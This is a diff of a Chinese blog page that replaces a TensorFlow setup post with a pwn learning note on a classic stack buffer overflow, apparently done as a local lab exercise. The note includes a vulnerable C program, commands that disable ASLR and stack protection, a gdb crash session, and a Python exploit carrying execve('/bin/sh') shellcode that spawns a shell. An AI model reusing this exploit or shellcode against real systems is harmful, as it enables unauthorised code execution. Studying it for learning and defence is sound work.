@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   
-  <title>tensorflow环境安装 | Saar&#39;s Blog</title>
+  <title>pwn学习笔记1 | Saar&#39;s Blog</title>
   
   
 
@@ -179,8 +179,8 @@
         
   
     <h1 class="title">
-      <a href="/2017/05/26/tensorflow%E5%AE%89%E8%A3%85%E5%B0%8F%E7%BB%93/">
-        tensorflow环境安装
+      <a href="/2020/01/23/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+        pwn学习笔记1
       </a>
     </h1>
   
@@ -211,7 +211,7 @@
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2017-05-26</p>
+    <p>2020-01-23</p>
   </a>
 </div>
 
@@ -221,9 +221,9 @@
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/' rel="nofollow">
+    <a href='/categories/pwn/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>深度学习</p>
+      <p>pwn</p>
     </a>
   </div>
 
@@ -269,15 +269,32 @@
 
     <section class="article typo">
       <div class="article-entry" itemprop="articleBody">
-        <h2 id="深度学习环境-tensorflow安装"><a href="#深度学习环境-tensorflow安装" class="headerlink" title="深度学习环境 tensorflow安装"></a>深度学习环境 tensorflow安装</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>需要支持RTX2080ti显卡，最好有11g现存。</p>
-<p>本人使用CUDA10.1，cudnn 10.1适配。</p>
-<p>python3.7 pycharm安装。</p>
-<p>anaconde3 安装多次使用了 anaconde3 4.4 版本安装上了。</p>
-<p>之后安装tensorflow，安装版本1.13版本的支持10.1的版本的tensorflow.</p>
-<h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个变量, 初始化为标量 0.</span></span><br><span class="line">state = tf.Variable(<span class="number">0</span>, name=<span class="string">"counter"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 op, 其作用是使 state 增加 1</span></span><br><span class="line">one = tf.constant(<span class="number">1</span>)</span><br><span class="line">new_value = tf.add(state, one)</span><br><span class="line">update = tf.assign(state, new_value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动图后, 变量必须先经过`初始化` (init) op 初始化,</span></span><br><span class="line"><span class="comment"># 首先必须增加一个`初始化` op 到图中.</span></span><br><span class="line"><span class="comment"># initialize_all_variables 警告换成 global_variables_initializer</span></span><br><span class="line">init_op = tf.global_variables_initializer()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动图, 运行 op</span></span><br><span class="line"><span class="keyword">with</span> tf.Session() <span class="keyword">as</span> sess:</span><br><span class="line">    <span class="comment"># 运行 'init' op</span></span><br><span class="line">    sess.run(init_op)</span><br><span class="line">    <span class="comment"># 打印 'state' 的初始值</span></span><br><span class="line">    print(sess.run(state))</span><br><span class="line">    <span class="comment"># 运行 op, 更新 'state', 并打印 'state'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        sess.run(update)</span><br><span class="line">        print(sess.run(state))</span><br></pre></td></tr></table></figure>
+        <h2 id="pwn学习笔记1"><a href="#pwn学习笔记1" class="headerlink" title="pwn学习笔记1"></a>pwn学习笔记1</h2><h3 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h3><p>其实参考的是<a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/文章中的教程，学习下pwn的基础知识。" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/文章中的教程，学习下pwn的基础知识。</a></p>
+<p>环境：ubuntu14.04</p>
+<p>漏洞代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">"Input:%s\n"</span>,buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>运行成功则正常。</p>
-<p>开启旅程啦~~</p>
+<p>其实就是简单的栈溢出利用，超过256个字符的时候会发生栈溢出问题。</p>
+<p>首先我们需要关闭内存地址随机化。保证栈溢出地址固定。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; <span class="regexp">/proc/sys</span><span class="regexp">/kernel/randomize</span>_va_space</span><br></pre></td></tr></table></figure>
+
+<p>编译和打开栈执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -z execstack -o vul1 vul1.c</span><br><span class="line">chmod +s vul1</span><br></pre></td></tr></table></figure>
+
+<p>gdb调试：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">saar@saar-virtual-machine:~/pwn$ gdb vul1 </span><br><span class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</span><br><span class="line">Copyright (C) 2014 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type "show copying"</span><br><span class="line">and "show warranty" for details.</span><br><span class="line">This GDB was configured as "i686-linux-gnu".</span><br><span class="line">Type "show configuration" for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type "help".</span><br><span class="line">Type "apropos word" to search for commands related to "word"...</span><br><span class="line">Reading symbols from vul1...done.</span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> dis</span></span><br><span class="line">disable      disassemble  disconnect   display      distance     </span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> disassemble main</span></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0804844d &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x0804844e &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x08048450 &lt;+3&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x08048453 &lt;+6&gt;:     sub    esp,0x110</span><br><span class="line">   0x08048459 &lt;+12&gt;:    mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">   0x0804845c &lt;+15&gt;:    add    eax,0x4</span><br><span class="line">   0x0804845f &lt;+18&gt;:    mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x08048461 &lt;+20&gt;:    mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x08048465 &lt;+24&gt;:    lea    eax,[esp+0x10]</span><br><span class="line">   0x08048469 &lt;+28&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x0804846c &lt;+31&gt;:    call   0x8048320 &lt;strcpy@plt&gt;</span><br><span class="line">   0x08048471 &lt;+36&gt;:    lea    eax,[esp+0x10]</span><br><span class="line">   0x08048475 &lt;+40&gt;:    mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x08048479 &lt;+44&gt;:    mov    DWORD PTR [esp],0x8048520</span><br><span class="line">   0x08048480 &lt;+51&gt;:    call   0x8048310 &lt;printf@plt&gt;</span><br><span class="line">   0x08048485 &lt;+56&gt;:    mov    eax,0x0</span><br><span class="line">   0x0804848a &lt;+61&gt;:    leave  </span><br><span class="line">   0x0804848b &lt;+62&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> r `python -c <span class="string">'print "A"*400'</span>`</span></span><br><span class="line">Starting program: /home/saar/pwn/vul1 `python -c 'print "A"*400'`</span><br><span class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0xb7fc0000 --&gt; 0x1acda8 </span><br><span class="line">ECX: 0x0 </span><br><span class="line">EDX: 0xb7fc1898 --&gt; 0x0 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x41414141 ('AAAA')</span><br><span class="line">ESP: 0xbffff460 ('A' &lt;repeats 128 times&gt;)</span><br><span class="line">EIP: 0x41414141 ('AAAA')</span><br><span class="line">EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41414141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff460 ('A' &lt;repeats 128 times&gt;)</span><br><span class="line">0004| 0xbffff464 ('A' &lt;repeats 124 times&gt;)</span><br><span class="line">0008| 0xbffff468 ('A' &lt;repeats 120 times&gt;)</span><br><span class="line">0012| 0xbffff46c ('A' &lt;repeats 116 times&gt;)</span><br><span class="line">0016| 0xbffff470 ('A' &lt;repeats 112 times&gt;)</span><br><span class="line">0020| 0xbffff474 ('A' &lt;repeats 108 times&gt;)</span><br><span class="line">0024| 0xbffff478 ('A' &lt;repeats 104 times&gt;)</span><br><span class="line">0028| 0xbffff47c ('A' &lt;repeats 100 times&gt;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41414141 in ?? ()</span><br></pre></td></tr></table></figure>
+
+<p>esp 地址是：0xbffff460，</p>
+<p>发现ret_address需要保证esp+N&lt;nop的数目</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</span><br><span class="line"></span><br><span class="line"><span class="comment">#Stack address where shellcode is copied.</span></span><br><span class="line">ret_addr = <span class="number">0xbffff480</span>      </span><br><span class="line">              </span><br><span class="line"><span class="comment">#Spawn a shell</span></span><br><span class="line"><span class="comment">#execve(/bin/sh)</span></span><br><span class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#endianess convertion</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span></span><br><span class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf = Junk + RA + NOP's + Shellcode</span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></span><br><span class="line">buf += conv(ret_addr)</span><br><span class="line">buf += <span class="string">"\x90"</span> * <span class="number">40</span></span><br><span class="line">buf += scode</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span></span><br><span class="line">call([<span class="string">"./vul1"</span>, buf])</span><br></pre></td></tr></table></figure>
+
+<p>最后获取shell:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">saar@saar-virtual-machine:~/pwn$ python exp.py </span><br><span class="line">Calling vulnerable program</span><br><span class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1/shh/bin</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> id</span></span><br><span class="line">uid=1000(saar) gid=1000(saar) groups=1000(saar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.jianshu.com/p/187b810e78d2" target="_blank" rel="noopener">https://www.jianshu.com/p/187b810e78d2</a></p>
+<p><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/</a></p>
 
       </div>
       
@@ -290,10 +307,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-01-18T14:31:32+00:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-01-23T03:04:09+00:00">
   <a class='notlink'>
     <i class="fas fa-clock" aria-hidden="true"></i>
-    <p>更新于 2020年1月18日</p>
+    <p>更新于 2020年1月23日</p>
   </a>
 </div>
 
@@ -302,7 +319,7 @@
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" rel="nofollow"><i class="fas fa-tag" aria-hidden="true"></i><p>深度学习</p></a></div>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/pwn/" rel="nofollow"><i class="fas fa-tag" aria-hidden="true"></i><p>pwn</p></a></div>
 
 
         
@@ -320,25 +337,25 @@
       
           <div class="prev-next">
               
-                  <section class="prev">
-                      <span class="art-item-left">
-                          <h6><i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;上一页</h6>
+              
+                  <section class="next">
+                      <span class="art-item-right" aria-hidden="true">
+                          <h6>下一页&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i></h6>
                           <h4>
-                              <a href="/2017/05/26/kubectl/" rel="prev" title="kubectl 学习笔记">
-                                
-                                    kubectl 学习笔记
-                                
+                              <a href="/2020/01/21/transfer%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" rel="prev" title="open-falcon transfer 源码分析">
+                                  
+                                      open-falcon transfer 源码分析
+                                  
                               </a>
                           </h4>
                           
                               
                               <h6 class="tags">
-                                  <a class="tag" href="/tags/k8s/"><i class="fas fa-tag fa-fw" aria-hidden="true"></i> k8s</a>
+                                  <a class="tag" href="/tags/monitor/"><i class="fas fa-tag fa-fw" aria-hidden="true"></i> monitor</a>
                               </h6>
                           
                       </span>
                   </section>
-              
               
           </div>
       
@@ -364,7 +381,7 @@
 
   <script>
     window.subData = {
-      title: 'tensorflow环境安装',
+      title: 'pwn学习笔记1',
       tools: true
     }
   </script>
@@ -473,7 +490,7 @@
 </header>
 
     <div class='content material'>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#深度学习环境-tensorflow安装"><span class="toc-text">深度学习环境 tensorflow安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境准备"><span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#运行测试"><span class="toc-text">运行测试</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn学习笔记1"><span class="toc-text">pwn学习笔记1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#学习笔记"><span class="toc-text">学习笔记</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol></li></ol>
     </div>
   </section>
 
